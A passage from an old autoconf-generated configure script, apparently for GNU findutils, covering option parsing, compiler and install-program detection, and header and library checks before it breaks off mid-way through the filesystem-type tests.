  -x-includes=* | --x-includes=* | --x-include=* | --x-includ=* | --x-inclu=* \
  | --x-incl=* | --x-inc=* | --x-in=* | --x-i=*)
    x_includes="$ac_optarg" ;;

  -x-libraries | --x-libraries | --x-librarie | --x-librari \
  | --x-librar | --x-libra | --x-libr | --x-lib | --x-li | --x-l)
    ac_prev=x_libraries ;;
  -x-libraries=* | --x-libraries=* | --x-librarie=* | --x-librari=* \
  | --x-librar=* | --x-libra=* | --x-libr=* | --x-lib=* | --x-li=* | --x-l=*)
    x_libraries="$ac_optarg" ;;

  -*) { echo "configure: error: $ac_option: invalid option; use --help to show usage" 1>&2; exit 1; }
    ;;

  *) 
    if test -n "`echo $ac_option| sed 's/[-a-z0-9.]//g'`"; then
      echo "configure: warning: $ac_option: invalid host type" 1>&2
    fi
    if test "x$nonopt" != xNONE; then
      { echo "configure: error: can only configure for one host and one target at a time" 1>&2; exit 1; }
    fi
    nonopt="$ac_option"
    ;;

  esac
done

if test -n "$ac_prev"; then
  { echo "configure: error: missing argument to --`echo $ac_prev | sed 's/_/-/g'`" 1>&2; exit 1; }
fi

trap 'rm -fr conftest* confdefs* core $ac_clean_files; exit 1' 1 2 15

# File descriptor usage:
# 0 unused; standard input
# 1 file creation
# 2 errors and warnings
# 3 unused; some systems may open it to /dev/tty
# 4 checking for... messages and results
# 5 compiler messages saved in config.log
if test "$silent" = yes; then
  exec 4>/dev/null
else
  exec 4>&1
fi
exec 5>./config.log

echo "\
This file contains any messages produced by compilers while
running configure, to aid debugging if configure makes a mistake.
" 1>&5

# Strip out --no-create and --no-recursion so they do not pile up.
# Also quote any args containing shell metacharacters.
ac_configure_args=
for ac_arg
do
  case "$ac_arg" in
  -no-create | --no-create | --no-creat | --no-crea | --no-cre \
  | --no-cr | --no-c) ;;
  -no-recursion | --no-recursion | --no-recursio | --no-recursi \
  | --no-recurs | --no-recur | --no-recu | --no-rec | --no-re | --no-r) ;;
  *" "*|*"	"*|*[\[\]\~\#\$\^\&\*\(\)\{\}\\\|\;\<\>\?]*)
  ac_configure_args="$ac_configure_args '$ac_arg'" ;;
  *) ac_configure_args="$ac_configure_args $ac_arg" ;;
  esac
done

# NLS nuisances.
# Only set LANG and LC_ALL to C if already set.
# These must not be set unconditionally because not all systems understand
# e.g. LANG=C (notably SCO).
if test "${LC_ALL+set}" = set; then LC_ALL=C; export LC_ALL; fi
if test "${LANG+set}"   = set; then LANG=C;   export LANG;   fi

# confdefs.h avoids OS command line length limits that DEFS can exceed.
rm -rf conftest* confdefs.h
# AIX cpp loses on an empty file, so make sure it contains at least a newline.
echo > confdefs.h

# A filename unique to this package, relative to the directory that
# configure is in, which we can look for to find out if srcdir is correct.
ac_unique_file=find/pred.c

# Find the source files, if location was not specified.
if test -z "$srcdir"; then
  ac_srcdir_defaulted=yes
  # Try the directory containing this script, then its parent.
  ac_prog=$0
  ac_confdir=`echo $ac_prog|sed 's%/[^/][^/]*$%%'`
  test "x$ac_confdir" = "x$ac_prog" && ac_confdir=.
  srcdir=$ac_confdir
  if test ! -r $srcdir/$ac_unique_file; then
    srcdir=..
  fi
else
  ac_srcdir_defaulted=no
fi
if test ! -r $srcdir/$ac_unique_file; then
  if test "$ac_srcdir_defaulted" = yes; then
    { echo "configure: error: can not find sources in $ac_confdir or .." 1>&2; exit 1; }
  else
    { echo "configure: error: can not find sources in $srcdir" 1>&2; exit 1; }
  fi
fi
srcdir=`echo "${srcdir}" | sed 's%\([^/]\)/*$%\1%'`

# Prefer explicitly selected file to automatically selected ones.
if test -z "$CONFIG_SITE"; then
  if test "x$prefix" != xNONE; then
    CONFIG_SITE="$prefix/share/config.site $prefix/etc/config.site"
  else
    CONFIG_SITE="$ac_default_prefix/share/config.site $ac_default_prefix/etc/config.site"
  fi
fi
for ac_site_file in $CONFIG_SITE; do
  if test -r "$ac_site_file"; then
    echo "loading site script $ac_site_file"
    . "$ac_site_file"
  fi
done

if test -r "$cache_file"; then
  echo "loading cache $cache_file"
  . $cache_file
else
  echo "creating cache $cache_file"
  > $cache_file
fi

ac_ext=c
# CFLAGS is not in ac_cpp because -g, -O, etc. are not valid cpp options.
ac_cpp='$CPP $CPPFLAGS'
ac_compile='${CC-cc} $CFLAGS $CPPFLAGS conftest.$ac_ext -c 1>&5 2>&5'
ac_link='${CC-cc} $CFLAGS $CPPFLAGS $LDFLAGS conftest.$ac_ext -o conftest $LIBS 1>&5 2>&5'

if (echo "testing\c"; echo 1,2,3) | grep c >/dev/null; then
  # Stardent Vistra SVR4 grep lacks -e, says ghazi@caip.rutgers.edu.
  if (echo -n testing; echo 1,2,3) | sed s/-n/xn/ | grep xn >/dev/null; then
    ac_n= ac_c='
' ac_t='	'
  else
    ac_n=-n ac_c= ac_t=
  fi
else
  ac_n= ac_c='\c' ac_t=
fi




# Check whether --enable-id-cache or --disable-id-cache was given.
enableval="$enable_id_cache"
if test -n "$enableval"; then
  cat >> confdefs.h <<\EOF
#define CACHE_IDS 1
EOF

fi

# Check whether --with-afs or --without-afs was given.
withval="$with_afs"
if test -n "$withval"; then
    cat >> confdefs.h <<\EOF
#define AFS 1
EOF

  CPPFLAGS="$CPPFLAGS -I/usr/afsws/include"
  LIBS="$LIBS -L/usr/afsws/lib -L/usr/afsws/lib/afs -lsys -lrx -llwp"
fi

if test "$program_transform_name" = s,x,x,; then
  program_transform_name=
else
  # Double any \ or $.
  echo 's,\\,\\\\,g; s,\$,$$,g' > conftestsed
  program_transform_name="`echo $program_transform_name|sed -f conftestsed`"
  rm -f conftestsed
fi
test "$program_prefix" != NONE &&
  program_transform_name="s,^,${program_prefix},; $program_transform_name"
# Use a double $ so make ignores it.
test "$program_suffix" != NONE &&
  program_transform_name="s,\$\$,${program_suffix},; $program_transform_name"

# sed with no file args requires a program.
test "$program_transform_name" = "" && program_transform_name="s,x,x,"


# Extract the first word of "gcc", so it can be a program name with args.
set dummy gcc; ac_word=$2
echo $ac_n "checking for $ac_word""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_prog_CC'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  if test -n "$CC"; then
  ac_cv_prog_CC="$CC" # Let the user override the test.
else
  IFS="${IFS= 	}"; ac_save_ifs="$IFS"; IFS="${IFS}:"
  for ac_dir in $PATH; do
    test -z "$ac_dir" && ac_dir=.
    if test -f $ac_dir/$ac_word; then
      ac_cv_prog_CC="gcc"
      break
    fi
  done
  IFS="$ac_save_ifs"
  test -z "$ac_cv_prog_CC" && ac_cv_prog_CC="cc"
fi
fi
CC="$ac_cv_prog_CC"
if test -n "$CC"; then
  echo "$ac_t""$CC" 1>&4
else
  echo "$ac_t""no" 1>&4
fi


echo $ac_n "checking whether we are using GNU C""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_prog_gcc'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.c <<EOF
#ifdef __GNUC__
  yes;
#endif
EOF
if ${CC-cc} -E conftest.c 2>&5 | egrep yes >/dev/null 2>&1; then
  ac_cv_prog_gcc=yes
else
  ac_cv_prog_gcc=no
fi
fi
echo "$ac_t""$ac_cv_prog_gcc" 1>&4
if test $ac_cv_prog_gcc = yes; then
  GCC=yes
  if test "${CFLAGS+set}" != set; then
    echo $ac_n "checking whether ${CC-cc} accepts -g""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_prog_gcc_g'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  echo 'void f(){}' > conftest.c
if test -z "`${CC-cc} -g -c conftest.c 2>&1`"; then
  ac_cv_prog_gcc_g=yes
else
  ac_cv_prog_gcc_g=no
fi
rm -f conftest*

fi
    echo "$ac_t""$ac_cv_prog_gcc_g" 1>&4
    if test $ac_cv_prog_gcc_g = yes; then
      CFLAGS="-g -O"
    else
      CFLAGS="-O"
    fi
  fi
else
  GCC=
  test "${CFLAGS+set}" = set || CFLAGS="-g"
fi

echo $ac_n "checking how to run the C preprocessor""... $ac_c" 1>&4
# On Suns, sometimes $CPP names a directory.
if test -n "$CPP" && test -d "$CPP"; then
  CPP=
fi
if test -z "$CPP"; then
if eval "test \"`echo '${'ac_cv_prog_CPP'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
    # This must be in double quotes, not single quotes, because CPP may get
  # substituted into the Makefile and "${CC-cc}" will confuse make.
  CPP="${CC-cc} -E"
  # On the NeXT, cc -E runs the code through the compiler's parser,
  # not just through cpp.
  cat > conftest.$ac_ext <<EOF
#line 533 "configure"
#include "confdefs.h"
#include <assert.h>
Syntax Error
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  :
else
  echo "$ac_err" >&5
  rm -rf conftest*
  CPP="${CC-cc} -E -traditional-cpp"
  cat > conftest.$ac_ext <<EOF
#line 547 "configure"
#include "confdefs.h"
#include <assert.h>
Syntax Error
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  :
else
  echo "$ac_err" >&5
  rm -rf conftest*
  CPP=/lib/cpp
fi
rm -f conftest*
fi
rm -f conftest*
  ac_cv_prog_CPP="$CPP"
fi
fi
CPP="$ac_cv_prog_CPP"
echo "$ac_t""$CPP" 1>&4

ac_aux_dir=
for ac_dir in $srcdir $srcdir/.. $srcdir/../..; do
  if test -f $ac_dir/install-sh; then
    ac_aux_dir=$ac_dir
    ac_install_sh="$ac_aux_dir/install-sh -c"
    break
  elif test -f $ac_dir/install.sh; then
    ac_aux_dir=$ac_dir
    ac_install_sh="$ac_aux_dir/install.sh -c"
    break
  fi
done
if test -z "$ac_aux_dir"; then
  { echo "configure: error: can not find install-sh or install.sh in $srcdir $srcdir/.. $srcdir/../.." 1>&2; exit 1; }
fi
ac_config_guess=$ac_aux_dir/config.guess
ac_config_sub=$ac_aux_dir/config.sub
ac_configure=$ac_aux_dir/configure # This should be Cygnus configure.

# Find a good install program.  We prefer a C program (faster),
# so one script is as good as another.  But avoid the broken or
# incompatible versions:
# SysV /etc/install, /usr/sbin/install
# SunOS /usr/etc/install
# IRIX /sbin/install
# AIX /bin/install
# AFS /usr/afsws/bin/install, which mishandles nonexistent args
# SVR4 /usr/ucb/install, which tries to use the nonexistent group "staff"
# ./install, which can be erroneously created by make from ./install.sh.
echo $ac_n "checking for a BSD compatible install""... $ac_c" 1>&4
if test -z "$INSTALL"; then
if eval "test \"`echo '${'ac_cv_path_install'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
    IFS="${IFS= 	}"; ac_save_ifs="$IFS"; IFS="${IFS}:"
  for ac_dir in $PATH; do
    case "$ac_dir" in
    ''|.|/etc|/usr/sbin|/usr/etc|/sbin|/usr/afsws/bin|/usr/ucb) ;;
    *)
      # OSF1 and SCO ODT 3.0 have their own names for install.
      for ac_prog in ginstall installbsd scoinst install; do
        if test -f $ac_dir/$ac_prog; then
	  if test $ac_prog = install &&
            grep dspmsg $ac_dir/$ac_prog >/dev/null 2>&1; then
	    # AIX install.  It has an incompatible calling convention.
	    # OSF/1 installbsd also uses dspmsg, but is usable.
	    :
	  else
	    ac_cv_path_install="$ac_dir/$ac_prog -c"
	    break 2
	  fi
	fi
      done
      ;;
    esac
  done
  IFS="$ac_save_ifs"
  # As a last resort, use the slow shell script.
  test -z "$ac_cv_path_install" && ac_cv_path_install="$ac_install_sh"
fi
  INSTALL="$ac_cv_path_install"
fi
echo "$ac_t""$INSTALL" 1>&4

# Use test -z because SunOS4 sh mishandles braces in ${var-val}.
# It thinks the first close brace ends the variable substitution.
test -z "$INSTALL_PROGRAM" && INSTALL_PROGRAM='${INSTALL}'

test -z "$INSTALL_DATA" && INSTALL_DATA='${INSTALL} -m 644'

# Extract the first word of "ranlib", so it can be a program name with args.
set dummy ranlib; ac_word=$2
echo $ac_n "checking for $ac_word""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_prog_RANLIB'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  if test -n "$RANLIB"; then
  ac_cv_prog_RANLIB="$RANLIB" # Let the user override the test.
else
  IFS="${IFS= 	}"; ac_save_ifs="$IFS"; IFS="${IFS}:"
  for ac_dir in $PATH; do
    test -z "$ac_dir" && ac_dir=.
    if test -f $ac_dir/$ac_word; then
      ac_cv_prog_RANLIB="ranlib"
      break
    fi
  done
  IFS="$ac_save_ifs"
  test -z "$ac_cv_prog_RANLIB" && ac_cv_prog_RANLIB=":"
fi
fi
RANLIB="$ac_cv_prog_RANLIB"
if test -n "$RANLIB"; then
  echo "$ac_t""$RANLIB" 1>&4
else
  echo "$ac_t""no" 1>&4
fi

echo $ac_n "checking whether ${MAKE-make} sets \$MAKE""... $ac_c" 1>&4
set dummy ${MAKE-make}; ac_make=$2
if eval "test \"`echo '${'ac_cv_prog_make_${ac_make}_set'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftestmake <<\EOF
all:
	@echo 'ac_maketemp="${MAKE}"'
EOF
# GNU make sometimes prints "make[1]: Entering...", which would confuse us.
eval `${MAKE-make} -f conftestmake 2>/dev/null | grep temp=`
if test -n "$ac_maketemp"; then
  eval ac_cv_prog_make_${ac_make}_set=yes
else
  eval ac_cv_prog_make_${ac_make}_set=no
fi
rm -f conftestmake
fi
if eval "test \"`echo '$ac_cv_prog_make_'${ac_make}_set`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  SET_MAKE=
else
  echo "$ac_t""no" 1>&4
  SET_MAKE="MAKE=${MAKE-make}"
fi


echo $ac_n "checking for AIX""... $ac_c" 1>&4
cat > conftest.$ac_ext <<EOF
#line 697 "configure"
#include "confdefs.h"
#ifdef _AIX
  yes
#endif

EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "yes" >/dev/null 2>&1; then
  rm -rf conftest*
  echo "$ac_t""yes" 1>&4; cat >> confdefs.h <<\EOF
#define _ALL_SOURCE 1
EOF

else
  rm -rf conftest*
  echo "$ac_t""no" 1>&4
fi
rm -f conftest*


ac_safe=`echo "minix/config.h" | tr './\055' '___'`
echo $ac_n "checking for minix/config.h""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_header_$ac_safe'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 724 "configure"
#include "confdefs.h"
#include <minix/config.h>
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  rm -rf conftest*
  eval "ac_cv_header_$ac_safe=yes"
else
  echo "$ac_err" >&5
  rm -rf conftest*
  eval "ac_cv_header_$ac_safe=no"
fi
rm -f conftest*
fi
if eval "test \"`echo '$ac_cv_header_'$ac_safe`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  MINIX=yes
else
  echo "$ac_t""no" 1>&4
MINIX=
fi

if test "$MINIX" = yes; then
  cat >> confdefs.h <<\EOF
#define _POSIX_SOURCE 1
EOF

  cat >> confdefs.h <<\EOF
#define _POSIX_1_SOURCE 2
EOF

  cat >> confdefs.h <<\EOF
#define _MINIX 1
EOF

fi

echo $ac_n "checking for POSIXized ISC""... $ac_c" 1>&4
if test -d /etc/conf/kconfig.d &&
  grep _POSIX_VERSION /usr/include/sys/unistd.h >/dev/null 2>&1
then
  echo "$ac_t""yes" 1>&4
  ISC=yes # If later tests want to check for ISC.
  cat >> confdefs.h <<\EOF
#define _POSIX_SOURCE 1
EOF

  if test "$GCC" = yes; then
    CC="$CC -posix"
  else
    CC="$CC -Xp"
  fi
else
  echo "$ac_t""no" 1>&4
  ISC=
fi


echo $ac_n "checking for -lsun""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_lib_sun'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  ac_save_LIBS="$LIBS"
LIBS="$LIBS -lsun "
cat > conftest.$ac_ext <<EOF
#line 791 "configure"
#include "confdefs.h"

int main() { return 0; }
int t() {
getpwnam()
; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_lib_sun=yes"
else
  rm -rf conftest*
  eval "ac_cv_lib_sun=no"
fi
rm -f conftest*
LIBS="$ac_save_LIBS"

fi
if eval "test \"`echo '$ac_cv_lib_'sun`\" = yes"; then
  echo "$ac_t""yes" 1>&4
    ac_tr_lib=HAVE_LIB`echo sun | tr '[a-z]' '[A-Z]'`
  cat >> confdefs.h <<EOF
#define $ac_tr_lib 1
EOF

  LIBS="$LIBS -lsun"

else
  echo "$ac_t""no" 1>&4
fi


for ac_hdr in fcntl.h string.h limits.h unistd.h
do
ac_safe=`echo "$ac_hdr" | tr './\055' '___'`
echo $ac_n "checking for $ac_hdr""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_header_$ac_safe'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 832 "configure"
#include "confdefs.h"
#include <$ac_hdr>
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  rm -rf conftest*
  eval "ac_cv_header_$ac_safe=yes"
else
  echo "$ac_err" >&5
  rm -rf conftest*
  eval "ac_cv_header_$ac_safe=no"
fi
rm -f conftest*
fi
if eval "test \"`echo '$ac_cv_header_'$ac_safe`\" = yes"; then
  echo "$ac_t""yes" 1>&4
    ac_tr_hdr=HAVE_`echo $ac_hdr | tr '[a-z]./\055' '[A-Z]___'`
  cat >> confdefs.h <<EOF
#define $ac_tr_hdr 1
EOF
 
else
  echo "$ac_t""no" 1>&4
fi
done

# If we cannot run a trivial program, we must be cross compiling.
echo $ac_n "checking whether cross-compiling""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_c_cross'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  if test "$cross_compiling" = yes; then
  ac_cv_cross=yes
else
cat > conftest.$ac_ext <<EOF
#line 869 "configure"
#include "confdefs.h"
main(){return(0);}
EOF
eval $ac_link
if test -s conftest && (./conftest; exit) 2>/dev/null; then
  ac_cv_c_cross=no
else
  ac_cv_c_cross=yes
fi
fi
rm -fr conftest*
fi
cross_compiling=$ac_cv_c_cross
echo "$ac_t""$ac_cv_c_cross" 1>&4

echo $ac_n "checking for ANSI C header files""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_header_stdc'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 890 "configure"
#include "confdefs.h"
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <float.h>
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  rm -rf conftest*
  ac_cv_header_stdc=yes
else
  echo "$ac_err" >&5
  rm -rf conftest*
  ac_cv_header_stdc=no
fi
rm -f conftest*

if test $ac_cv_header_stdc = yes; then
  # SunOS 4.x string.h does not declare mem*, contrary to ANSI.
cat > conftest.$ac_ext <<EOF
#line 912 "configure"
#include "confdefs.h"
#include <string.h>
EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "memchr" >/dev/null 2>&1; then
  :
else
  rm -rf conftest*
  ac_cv_header_stdc=no
fi
rm -f conftest*

fi

if test $ac_cv_header_stdc = yes; then
  # ISC 2.0.2 stdlib.h does not declare free, contrary to ANSI.
cat > conftest.$ac_ext <<EOF
#line 930 "configure"
#include "confdefs.h"
#include <stdlib.h>
EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "free" >/dev/null 2>&1; then
  :
else
  rm -rf conftest*
  ac_cv_header_stdc=no
fi
rm -f conftest*

fi

if test $ac_cv_header_stdc = yes; then
  # /bin/cc in Irix-4.0.5 gets non-ANSI ctype macros unless using -ansi.
if test "$cross_compiling" = yes; then
  ac_cv_header_stdc=no
else
cat > conftest.$ac_ext <<EOF
#line 951 "configure"
#include "confdefs.h"
#include <ctype.h>
#define ISLOWER(c) ('a' <= (c) && (c) <= 'z')
#define TOUPPER(c) (ISLOWER(c) ? 'A' + ((c) - 'a') : (c))
#define XOR(e, f) (((e) && !(f)) || (!(e) && (f)))
int main () { int i; for (i = 0; i < 256; i++)
if (XOR (islower (i), ISLOWER (i)) || toupper (i) != TOUPPER (i)) exit(2);
exit (0); }

EOF
eval $ac_link
if test -s conftest && (./conftest; exit) 2>/dev/null; then
  :
else
  ac_cv_header_stdc=no
fi
fi
rm -fr conftest*
fi
fi
echo "$ac_t""$ac_cv_header_stdc" 1>&4
if test $ac_cv_header_stdc = yes; then
  cat >> confdefs.h <<\EOF
#define STDC_HEADERS 1
EOF

fi

echo $ac_n "checking whether sys/types.h defines makedev""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_header_sys_types_h_makedev'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 985 "configure"
#include "confdefs.h"
#include <sys/types.h>
int main() { return 0; }
int t() {
return makedev(0, 0);
; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  ac_cv_header_sys_types_h_makedev=yes
else
  rm -rf conftest*
  ac_cv_header_sys_types_h_makedev=no
fi
rm -f conftest*


fi
echo "$ac_t""$ac_cv_header_sys_types_h_makedev" 1>&4

if test $ac_cv_header_sys_types_h_makedev = no; then
ac_safe=`echo "sys/mkdev.h" | tr './\055' '___'`
echo $ac_n "checking for sys/mkdev.h""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_header_$ac_safe'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1013 "configure"
#include "confdefs.h"
#include <sys/mkdev.h>
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  rm -rf conftest*
  eval "ac_cv_header_$ac_safe=yes"
else
  echo "$ac_err" >&5
  rm -rf conftest*
  eval "ac_cv_header_$ac_safe=no"
fi
rm -f conftest*
fi
if eval "test \"`echo '$ac_cv_header_'$ac_safe`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  cat >> confdefs.h <<\EOF
#define MAJOR_IN_MKDEV 1
EOF

else
  echo "$ac_t""no" 1>&4
fi


  if test $ac_cv_header_sys_mkdev_h = no; then
ac_safe=`echo "sys/sysmacros.h" | tr './\055' '___'`
echo $ac_n "checking for sys/sysmacros.h""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_header_$ac_safe'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1047 "configure"
#include "confdefs.h"
#include <sys/sysmacros.h>
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  rm -rf conftest*
  eval "ac_cv_header_$ac_safe=yes"
else
  echo "$ac_err" >&5
  rm -rf conftest*
  eval "ac_cv_header_$ac_safe=no"
fi
rm -f conftest*
fi
if eval "test \"`echo '$ac_cv_header_'$ac_safe`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  cat >> confdefs.h <<\EOF
#define MAJOR_IN_SYSMACROS 1
EOF

else
  echo "$ac_t""no" 1>&4
fi

  fi
fi

ac_header_dirent=no
for ac_hdr in dirent.h sys/ndir.h sys/dir.h ndir.h
do
ac_safe=`echo "$ac_hdr" | tr './\055' '___'`
echo $ac_n "checking for $ac_hdr that defines DIR""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_header_dirent_$ac_safe'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1085 "configure"
#include "confdefs.h"
#include <sys/types.h>
#include <$ac_hdr>
int main() { return 0; }
int t() {
DIR *dirp = 0;
; return 0; }
EOF
if eval $ac_compile; then
  rm -rf conftest*
  eval "ac_cv_header_dirent_$ac_safe=yes"
else
  rm -rf conftest*
  eval "ac_cv_header_dirent_$ac_safe=no"
fi
rm -f conftest*

fi
if eval "test \"`echo '$ac_cv_header_dirent_'$ac_safe`\" = yes"; then
  echo "$ac_t""yes" 1>&4
    ac_tr_hdr=HAVE_`echo $ac_hdr | tr '[a-z]./\055' '[A-Z]___'`
  cat >> confdefs.h <<EOF
#define $ac_tr_hdr 1
EOF
 ac_header_dirent=$ac_hdr; break
else
  echo "$ac_t""no" 1>&4
fi
done
# Two versions of opendir et al. are in -ldir and -lx on SCO Xenix.
if test $ac_header_dirent = dirent.h; then
echo $ac_n "checking for -ldir""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_lib_dir'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  ac_save_LIBS="$LIBS"
LIBS="$LIBS -ldir "
cat > conftest.$ac_ext <<EOF
#line 1124 "configure"
#include "confdefs.h"

int main() { return 0; }
int t() {
opendir()
; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_lib_dir=yes"
else
  rm -rf conftest*
  eval "ac_cv_lib_dir=no"
fi
rm -f conftest*
LIBS="$ac_save_LIBS"

fi
if eval "test \"`echo '$ac_cv_lib_'dir`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  LIBS="$LIBS -ldir"
else
  echo "$ac_t""no" 1>&4
fi

else
echo $ac_n "checking for -lx""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_lib_x'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  ac_save_LIBS="$LIBS"
LIBS="$LIBS -lx "
cat > conftest.$ac_ext <<EOF
#line 1158 "configure"
#include "confdefs.h"

int main() { return 0; }
int t() {
opendir()
; return 0; }
EOF
if eval $ac_link; then
  rm -rf conftest*
  eval "ac_cv_lib_x=yes"
else
  rm -rf conftest*
  eval "ac_cv_lib_x=no"
fi
rm -f conftest*
LIBS="$ac_save_LIBS"

fi
if eval "test \"`echo '$ac_cv_lib_'x`\" = yes"; then
  echo "$ac_t""yes" 1>&4
  LIBS="$LIBS -lx"
else
  echo "$ac_t""no" 1>&4
fi

fi

echo $ac_n "checking whether stat file-mode macros are broken""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_header_stat_broken'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1191 "configure"
#include "confdefs.h"
#include <sys/types.h>
#include <sys/stat.h>
#ifdef S_ISBLK
# if S_ISBLK (S_IFDIR)
You lose.
# endif
# ifdef S_IFCHR
#  if S_ISBLK (S_IFCHR)
You lose.
#  endif
# endif
#endif

#ifdef S_ISLNK
# if S_ISLNK (S_IFREG)
You lose.
# endif
#endif

#ifdef S_ISSOCK
# if S_ISSOCK (S_IFREG)
You lose.
# endif
#endif

EOF
if (eval "$ac_cpp conftest.$ac_ext") 2>&5 |
  egrep "You lose" >/dev/null 2>&1; then
  rm -rf conftest*
  ac_cv_header_stat_broken=yes
else
  rm -rf conftest*
  ac_cv_header_stat_broken=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_header_stat_broken" 1>&4
if test $ac_cv_header_stat_broken = yes; then
  cat >> confdefs.h <<\EOF
#define STAT_MACROS_BROKEN 1
EOF

fi

echo $ac_n "checking for sys/wait.h that is POSIX.1 compatible""... $ac_c" 1>&4
if eval "test \"`echo '${'ac_cv_header_sys_wait_h'+set}'`\" = set"; then
  echo $ac_n "(cached) $ac_c" 1>&4
else
  cat > conftest.$ac_ext <<EOF
#line 1243 "configure"
#include "confdefs.h"
#include <sys/types.h>
#include <sys/wait.h>
#ifndef WEXITSTATUS
#define WEXITSTATUS(stat_val) ((unsigned)(stat_val) >> 8)
#endif
#ifndef WIFEXITED
#define WIFEXITED(stat_val) (((stat_val) & 255) == 0)
#endif
int main() { return 0; }
int t() {
int s;
wait (&s);
s = WIFEXITED (s) ? WEXITSTATUS (s) : 1;
; return 0; }
EOF
if eval $ac_compile; then
  rm -rf conftest*
  ac_cv_header_sys_wait_h=yes
else
  rm -rf conftest*
  ac_cv_header_sys_wait_h=no
fi
rm -f conftest*

fi
echo "$ac_t""$ac_cv_header_sys_wait_h" 1>&4
if test $ac_cv_header_sys_wait_h = yes; then
  cat >> confdefs.h <<\EOF
#define HAVE_SYS_WAIT_H 1
EOF

fi


echo $ac_n "checking how to get filesystem type""... $ac_c" 1>&4
fstype=no
# The order of these tests is important.
cat > conftest.$ac_ext <<EOF
#line 1283 "configure"
#include "confdefs.h"
#include <sys/statvfs.h>
#include <sys/fstyp.h>
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  rm -rf conftest*
  cat >> confdefs.h <<\EOF
#define FSTYPE_STATVFS 1
EOF
 fstype=SVR4
else
  echo "$ac_err" >&5
fi
rm -f conftest*
if test $fstype = no; then
cat > conftest.$ac_ext <<EOF
#line 1302 "configure"
#include "confdefs.h"
#include <sys/statfs.h>
#include <sys/fstyp.h>
EOF
eval "$ac_cpp conftest.$ac_ext >/dev/null 2>conftest.out"
ac_err=`grep -v '^ *+' conftest.out`
if test -z "$ac_err"; then
  rm -rf conftest*
  cat >> confdefs.h <<\EOF
